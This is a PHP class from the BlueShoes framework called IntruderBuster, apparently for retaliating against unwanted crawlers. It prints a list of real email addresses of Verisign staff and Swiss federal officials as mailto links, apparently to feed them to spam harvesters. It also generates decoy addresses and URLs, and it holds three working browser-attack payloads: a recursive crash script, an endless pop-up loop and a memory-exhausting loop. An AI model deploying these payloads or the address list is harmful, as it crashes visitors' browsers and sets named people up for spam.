<?php/********************************************************************************************
* BlueShoes Framework; This file is part of the php application framework.
* NOTE: This code is stripped (obfuscated). To get the clean documented code goto 
*       www.blueshoes.org and register for the free open source *DEVELOPER* version or 
*       buy the commercial version.
*       
*       In case you've already got the developer version, then this is one of the few 
*       packages/classes that is only available to *PAYING* customers.
*       To get it go to www.blueshoes.org and buy a commercial version.
* 
* @copyright www.blueshoes.org
* @author    Samuel Blume <sam at blueshoes dot org>
* @author    Andrej Arn <andrej at blueshoes dot org>
*/?><?php
define('BS_INTRUDERBUSTER_VERSION',      '4.5.$Revision: 1.3 $');if (!@$APP) require_once($_SERVER['DOCUMENT_ROOT'] . $GLOBALS['APP']['path']['diffFromDocRootToGlobalConf'] . 'global.conf.php');class Bs_IntruderBuster extends Bs_Object {function Bs_IntruderBuster() {parent::Bs_Object();}
function send403forbidden() {header('HTTP/1.1 403 Forbidden');exit;}
function getBadMailAddresses() {$str = <<< EOD
    domainsales@exclusivedomainlist.com
    domains@domaindeluxe.com
    support@domaindeluxe.com
    
    ifpi@swissonline.ch
    
    kundenservice@bol.com
    anemeth@bol.com
    
    verisales@verisign.com 
    websitesales@verisign.com 
    internetsales@verisign.com 
    paymentsales@verisign.com 
    secureexpress@verisign.com 
    vts-mktginfo@verisign.com
    dbms-support@verisign.com 
    salesinfo@verisign.com
    partnerprogram@netsol.com 
    partnerprogram@verisign.com
    asiapacific@netsol.com 
    latinamerica@netsol.com
    japan@netsol.com 
    ispsales@verisign.com 
    volumediscount@netsol.com 
    education@verisign.com
    websitesupport@verisign.com
    webhelp@verisign.com
    support@verisign.com
    renewal@verisign.com 
    vts-csrgroup@verisign.com 
    authenticode-support@verisign.com
    objectsigning-support@verisign.com
    enterprise-sslsupport@verisign.com
    enterprise-pkisupport@verisign.com
    vps-support@verisign.com
    privacy@networksolutions.com
    id-support@verisign.com
    vps-finance@verisign.com 
    billing@verisign.com 
    jobs@verisign.com
    press@verisign.com 
    IR@verisign.com
    dcpolicy@verisign.com 
    
    
    webmaster@admin.ch
    info@eda.admin.ch
    info@gs-ejpd.admin.ch 
    info@gs-edi.admin.ch
    info@gs-efd.admin.ch 
    webmaster@gs-uvek.admin.ch 
    direktion@bger.admin.ch
    Internet.Webmaster@gs-evd.admin.ch
    information@pd.admin.ch
    samuel.schmid@gs-vbs.admin.ch
    webmaster-vbs@gs-vbs.admin.ch
    aar@he.admin.ch
    hansruedi.indermuehle@gr.admin.ch
    afd.sekretariat@he.admin.ch
    stefano.pellandini@gs-vbs.admin.ch
    rekrutierung@gst.admin.ch
    jean-jacques.joss@he.admin.ch
    webmaster@lt.admin.ch
    hans-peter.iseli@balog.admin.ch
    sekretariat@baut.admin.ch
    josef.inauen@gs-vbs.admin.ch
    daniel.reist@fwk.admin.ch
    fda@gst.admin.ch
    info.swisspso@gst.admin.ch
    isp.webmaster@gs-vbs.admin.ch
    francois.schroeter@gst.admin.ch
    juerg.nussbaum@lw.admin.ch
    muvk.sekr@he.admin.ch
    militaermusik@bluewin.ch
    dipra@gs-vbs.admin.ch
    markus.fischer@he.admin.ch
    Info-Log@gst.admin.ch
    peter.gilgen@gst.admin.ch
    info@bzs.admin.ch
EOD;
$arr = explode("\n", $str);$ret = '';while (list(,$email) = each($arr)) {$email = trim($email);if (strlen($email) < 2) continue;$ret .= "<a href='mailto:{$email}'>{$email}</a><br>\n";}
return $ret;}
function generateRandomEmails($num=50) {$ret = '';for ($i=0; $i<$num; $i++) {$user = '';$num2 = (string)mt_rand(10000000, 99999999);for ($j=0; $j<strlen($num2)-1; $j++) {$user .= chr(97 + $num2[$j]);}
$user .= $num2[$j];$email  = $user . '@' . $this->_getRandomDomain();$ret .= "<a href='mailto:{$email}'>{$email}</a><br>\n";}
return $ret;}
function generateRandomUrls($num=50) {$path = array('/', '/nada/', '/foo/', '/foo/bar/', '/hello/', '/hello/world/');$file = array('', 'index.html', 'content.html', 'something.htm', 'surprise.html');$ret = '';for ($i=0; $i<$num; $i++) {$url  = 'http://www.' . $this->_getRandomDomain();$numPath = mt_rand(0, sizeOf($path)-1);$numFile = mt_rand(0, sizeOf($file)-1);$url .= $path[$numPath] . $file[$numFile];$ret .= "<a href='{$url}'>{$url}</a><br>\n";}
return $ret;}
function _getRandomTld() {static $tld = array('com', 'net', 'org', 'de', 'fr', 'co.uk');$num = mt_rand(0, sizeOf($tld) -1);return $tld[$num];}
function _getRandomDomain() {$dom = '';$num = (string)mt_rand(10000000, 99999999);for ($i=0; $i<strlen($num)-1; $i++) {$dom .= chr(97 + $num[$i]);}
$dom .= $num[$i];return $dom . '.' . $this->_getRandomTld();}
function crashBrowserByJsBug() {$script = '</scr' . 'ipt>';$ret = <<< EOD
<html>
<head>
<script language="JavaScript">
<!--
function crashMe() {
document.write('>');
var url = document.location
if (document.images) {
location.replace(url);
} else {
location.href = url;
}
crashMe()
}
//-->
{$script}
</head>
<body onLoad="crashMe()">
blah.
</body>
</html>
EOD;
return $ret;}
function endlessLoopWindowOpen() {$script = '</scr' . 'ipt>';$ret = <<< EOD
<html>
<head>
<script language="JavaScript">
<!--
for (var i=0; i<1; i=0) {
  x = window.open("http://www.yahoo.com/file.htm", "winx"+i, "width=100,height=100,left=2000,top=2000");
}
//-->
{$script}
</head>
<body>
blah.
</body>
</html>
EOD;
return $ret;}
function endlessLoopJs() {return '<script><!-- for (var i=0; i<1; i=0) { hungry += "eatSomeMemory"; } //--></script>';}
}
?>